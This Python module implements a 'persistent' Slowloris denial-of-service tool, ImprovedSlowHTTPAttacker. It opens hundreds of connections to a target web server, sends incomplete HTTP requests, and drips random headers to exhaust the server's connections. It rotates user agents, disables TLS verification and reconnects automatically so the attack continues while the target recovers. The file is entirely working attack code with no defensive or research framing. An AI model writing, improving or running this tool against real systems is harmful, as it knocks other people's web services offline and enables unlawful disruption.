#!/usr/bin/env python3
"""
Improved Attack Classes with Persistent Attack Support
"""

import socket
import ssl
import time
import random
import string
import threading
import signal
import logging
from typing import Optional, Dict, List

logger = logging.getLogger(__name__)


class ImprovedSlowHTTPAttacker:
    """
    Enhanced SlowHTTP Attacker with persistent attack capabilities
    """
    def __init__(self, target: str, port: int = 80, use_ssl: bool = False, 
                 user_agent: Optional[str] = None, path: str = "/"):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = False
        self.connections = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {},
            "reconnection_attempts": 0,
            "successful_reconnections": 0
        }
        
        # User agent rotation
        if not user_agent:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
            ]
            self.user_agent = random.choice(self.user_agents)
        else:
            self.user_agent = user_agent
    
    def _create_connection(self) -> Optional[socket.socket]:
        """Create a new connection with retry logic"""
        max_retries = 3
        retry_delay = 2
        
        for attempt in range(max_retries):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target, self.port))
                
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target)
                
                return sock
                
            except (ConnectionRefusedError, socket.timeout, OSError) as e:
                logger.warning(f"Connection attempt {attempt + 1} failed: {str(e)}")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay * (attempt + 1))
                else:
                    with self.lock:
                        self.stats["error_count"] += 1
                    return None
            
            except Exception as e:
                logger.error(f"Unexpected connection error: {str(e)}")
                return None
        
        return None
    
    def _send_header(self, sock: socket.socket, header: str) -> bool:
        """Send header with error handling"""
        try:
            sock.send(header.encode())
            with self.lock:
                self.stats["packets_sent"] += 1
                self.stats["bytes_sent"] += len(header)
            return True
        except Exception as e:
            logger.debug(f"Failed to send header: {str(e)}")
            return False
    
    def _reconnect_socket(self, old_sock: socket.socket) -> Optional[socket.socket]:
        """Reconnect a failed socket"""
        try:
            old_sock.close()
        except:
            pass
        
        with self.lock:
            self.stats["reconnection_attempts"] += 1
        
        new_sock = self._create_connection()
        if new_sock:
            with self.lock:
                self.stats["successful_reconnections"] += 1
            return new_sock
        
        return None
    
    def slowloris_attack_persistent(self, num_connections: int, delay: float, 
                                   duration: int, auto_recover: bool = True):
        """
        Slowloris attack with persistent connection and auto-recovery
        Continues attacking even if target goes down temporarily
        """
        self.running = True
        self.stop_event.clear()
        self.connections = []
        
        print(f"[*] Starting Persistent Slowloris attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        print(f"[*] Auto-recovery: {'Enabled' if auto_recover else 'Disabled'}")
        print(f"[*] Press Ctrl+C to stop the attack")
        
        # Setup signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\n[!] Ctrl+C detected - Stopping attack gracefully...")
            self.stop_attack()
            self.stop_event.set()
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        end_time = time.time() + duration
        last_status_update = time.time()
        
        try:
            # Phase 1: Create initial connections
            print(f"[*] Creating {num_connections} initial connections...")
            for i in range(num_connections):
                if self.stop_event.is_set() or not self.running:
                    break
                
                sock = self._create_connection()
                if sock:
                    # Send initial incomplete HTTP request
                    request = f"GET {self.path} HTTP/1.1\r\n"
                    request += f"Host: {self.target}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    request += "Accept-Language: en-US,en;q=0.5\r\n"
                    request += "Accept-Encoding: gzip, deflate\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += "Cache-Control: no-cache\r\n"
                    
                    if self._send_header(sock, request):
                        self.connections.append(sock)
                        with self.lock:
                            self.stats["connections_active"] += 1
                
                if (i + 1) % 50 == 0:
                    print(f"[*] Created {i + 1}/{num_connections} connections")
            
            print(f"[*] Successfully created {len(self.connections)} connections")
            
            # Phase 2: Maintain connections and send keep-alive headers
            while self.running and time.time() < end_time and not self.stop_event.is_set():
                # Send keep-alive headers to all connections
                failed_connections = []
                
                for sock in self.connections[:]:
                    if self.stop_event.is_set():
                        break
                    
                    # Generate random header to keep connection alive
                    headers = [
                        f"X-a: {random.randint(1, 5000)}\r\n",
                        f"X-b: {random.randint(1, 5000)}\r\n",
                        f"X-c: {random.randint(1, 5000)}\r\n",
                        f"X-Custom-Header-{random.randint(1, 100)}: {self._random_string(10)}\r\n"
                    ]
                    
                    header = random.choice(headers)
                    
                    if not self._send_header(sock, header):
                        failed_connections.append(sock)
                
                # Handle failed connections
                if failed_connections and auto_recover:
                    print(f"[!] {len(failed_connections)} connections failed, attempting recovery...")
                    
                    for failed_sock in failed_connections:
                        if self.stop_event.is_set():
                            break
                        
                        self.connections.remove(failed_sock)
                        with self.lock:
                            self.stats["connections_active"] -= 1
                        
                        # Try to reconnect
                        new_sock = self._reconnect_socket(failed_sock)
                        if new_sock:
                            # Send initial headers
                            request = f"GET {self.path} HTTP/1.1\r\n"
                            request += f"Host: {self.target}\r\n"
                            request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                            request += "Connection: keep-alive\r\n"
                            
                            if self._send_header(new_sock, request):
                                self.connections.append(new_sock)
                                with self.lock:
                                    self.stats["connections_active"] += 1
                
                # Status update every 10 seconds
                if time.time() - last_status_update >= 10:
                    self._print_status()
                    last_status_update = time.time()
                
                # Wait before next keep-alive cycle
                time.sleep(delay)
            
            # Final status
            print("\n[*] Attack completed")
            self._print_status()
            
        except Exception as e:
            logger.error(f"Attack error: {str(e)}")
            print(f"[!] Attack error: {str(e)}")
        
        finally:
            self.stop_attack()
    
    def _random_string(self, length: int) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _print_status(self):
        """Print current attack status"""
        with self.lock:
            print(f"\n{'='*60}")
            print(f"[STATUS] Active Connections: {self.stats['connections_active']}")
            print(f"[STATUS] Packets Sent: {self.stats['packets_sent']}")
            print(f"[STATUS] Bytes Sent: {self.stats['bytes_sent']}")
            print(f"[STATUS] Errors: {self.stats['error_count']}")
            print(f"[STATUS] Reconnection Attempts: {self.stats['reconnection_attempts']}")
            print(f"[STATUS] Successful Reconnections: {self.stats['successful_reconnections']}")
            print(f"{'='*60}\n")
    
    def stop_attack(self):
        """Stop the attack and cleanup"""
        self.running = False
        print("[*] Cleaning up connections...")
        
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass
        
        self.connections = []
        with self.lock:
            self.stats["connections_active"] = 0
        
        print("[*] Attack stopped successfully")
    
    def get_stats(self) -> Dict:
        """Get current attack statistics"""
        with self.lock:
            return self.stats.copy()


# Export
__all__ = ['ImprovedSlowHTTPAttacker']
